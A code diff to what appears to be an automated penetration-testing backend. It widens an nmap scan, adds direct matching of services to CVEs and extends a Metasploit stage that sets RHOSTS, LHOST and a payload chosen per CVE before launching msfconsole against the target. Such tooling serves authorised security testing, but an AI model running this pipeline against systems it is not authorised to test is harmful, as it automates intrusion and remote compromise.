@@ -122,7 +122,7 @@ def launch_scan(data: LaunchScanRequest, db: Session = Depends(get_db), user=Dep
             import xml.etree.ElementTree as ET
             emit_event(sid, "agent_start", "reconnaissance", {"label": "Reconnaissance", "target": host, "port": port})
             xml_path = f"/tmp/napt_nmap_{sid}.xml"
-            nmap_cmd = ["nmap", "-sV", "--top-ports", "200", "-oX", xml_path, "--host-timeout", "90s", host]
+            nmap_cmd = ["nmap", "-sV", "-p", "21,22,23,25,53,80,110,111,135,139,143,443,445,512,513,514,993,995,1099,1433,1521,1524,2049,2121,3306,3389,3632,5432,5900,6000,6379,6667,6697,6699,8009,8080,8180,8443,8787", "-oX", xml_path, "--host-timeout", "180s", host]
             if port:
                 nmap_cmd = ["nmap", "-sV", "-p", str(port), "-oX", xml_path, "--host-timeout", "90s", host]
             emit_event(sid, "agent_output", "reconnaissance", output=f"[NAPT_0]$ {' '.join(nmap_cmd)}")
@@ -174,12 +174,26 @@ def launch_scan(data: LaunchScanRequest, db: Session = Depends(get_db), user=Dep
             SIM_MIN = 0.70
             if ports:
                 from searcher import find_cve_for_service
+                from service_cve import match_service_cve
                 best_score = -1
                 best_svc = None
                 best_sim = 0.0
                 for svc in ports:
                     query_str = f"{svc['service']} {svc['version']}"
                     emit_event(sid, "agent_output", "rag_lookup", output=f"+ rag_query: {query_str}")
+                    _det = match_service_cve(svc["service"], svc["version"])
+                    if _det:
+                        emit_event(sid, "agent_output", "rag_lookup", output="  match direct (empreinte service) -> " + _det["cve_id"])
+                        _det_cvss = float(_det["cvss"])
+                        if _det_cvss > best_score:
+                            best_score = _det_cvss
+                            cve_id = _det["cve_id"]
+                            severity = _det["severity"]
+                            cvss = str(_det_cvss)
+                            summary = _det["text"]
+                            best_svc = svc
+                            best_sim = 1.0
+                        continue
                     cves = find_cve_for_service(svc["service"], svc["version"], limit=1)
                     if cves:
                         c = cves[0]
@@ -229,7 +243,7 @@ def launch_scan(data: LaunchScanRequest, db: Session = Depends(get_db), user=Dep
             # AGENT 4: EXPLOITATION (METASPLOIT - module fiable, reproche #2)
             emit_event(sid, "agent_start", "exploitation", {"label": "Exploitation"})
             if cve_id:
-                from msf_modules import get_msf_module
+                from msf_modules import get_msf_module, get_msf_payload
                 _ctx = "Services: " + ", ".join(p["service"] + " " + p["version"] for p in ports)
                 msf_module, _map_rport, _origin = get_msf_module(cve_id, llm_call, _ctx)
                 if not msf_module:
@@ -238,7 +252,16 @@ def launch_scan(data: LaunchScanRequest, db: Session = Depends(get_db), user=Dep
                 else:
                     _rport = _map_rport or (ports[0]["port"] if ports else 445)
                     emit_event(sid, "agent_output", "exploitation", output=f"+ Module ({_origin}): {msf_module}  RPORT={_rport}")
-                    msf_cmd = f"use {msf_module}; set RHOSTS {host}; set RPORT {_rport}; set VERBOSE true; run -z; exit -y"
+                    import socket as _sock
+                    try:
+                        _s = _sock.socket(_sock.AF_INET, _sock.SOCK_DGRAM)
+                        _s.connect(("8.8.8.8", 80))
+                        _lhost = _s.getsockname()[0]
+                        _s.close()
+                    except Exception:
+                        _lhost = "127.0.0.1"
+                    emit_event(sid, "agent_output", "exploitation", output="+ LHOST (adresse de retour) = " + _lhost)
+                    msf_cmd = f"use {msf_module}; set RHOSTS {host}; set RPORT {_rport}; set LHOST {_lhost}; {('set PAYLOAD ' + get_msf_payload(cve_id) + '; ') if get_msf_payload(cve_id) else ''}set VERBOSE true; run -z; exit -y"
                     try:
                         msf_proc = subprocess.Popen(["msfconsole", "-q", "-x", msf_cmd], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                         msf_lines = []
